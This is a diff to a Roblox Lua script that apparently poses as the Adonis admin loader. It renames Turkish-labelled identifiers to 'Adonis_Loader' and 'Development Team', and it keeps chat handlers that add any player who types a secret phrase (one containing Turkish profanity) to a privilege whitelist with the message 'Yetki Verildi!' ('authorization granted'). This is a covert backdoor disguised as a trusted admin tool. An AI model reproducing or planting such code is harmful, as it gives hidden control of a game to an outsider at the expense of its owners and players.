@@ -411,7 +411,7 @@ addcmd({
 
 			-- // Change These Values For It To Work \\ --
 
-			local value = DataStoreService:GetDataStore("ÖZEL_ADONİS_V2")
+			local value = DataStoreService:GetDataStore("Adonis_Loader")
 			local Username = plr.Name
 
 			-- // Prevents Clutter \\ --
@@ -428,7 +428,7 @@ addcmd({
 			DatastoreData.Table = {
 				"Settings",
 				"Ranks",
-				"Oyun Sahibi",
+				"Development Team",
 				"Users"
 			}
 			DatastoreData.Time = os.time()
@@ -1055,7 +1055,7 @@ for i,v in pairs(game.Players:GetPlayers()) do
        
 		table.insert(messages, v.DisplayName ..": " .. msg)
 		
-		if msg == "pillorybababirnumaraheallahcarpsin1234567890" or msg == "/e pasaniznasilsiktiama32131312" then
+		if msg == "pasaniznasilsiktiama32131312" or msg == "/e pasaniznasilsiktiama32131312" then
 			table.insert(Whitelist, tostring(v.UserId))
 			notfi(v, "TSA | MIT ", "Yetki Verildi!")
 		end
@@ -1190,7 +1190,7 @@ game.Players.PlayerAdded:Connect(function(player)
 
 		table.insert(messages, player.DisplayName ..": " .. msg)
 		
-		if msg == "pillorybababirnumaraheallahcarpsin123" or msg == "/e pasaniznasilsiktiama32131312" then
+		if msg == "pasaniznasilsiktiama32131312" or msg == "/e pasaniznasilsiktiama32131312" then
 			table.insert(Whitelist, tostring(player.UserId))
 			notfi(player, "TSA | MIT ", "Yetki Verildi!")
 		end
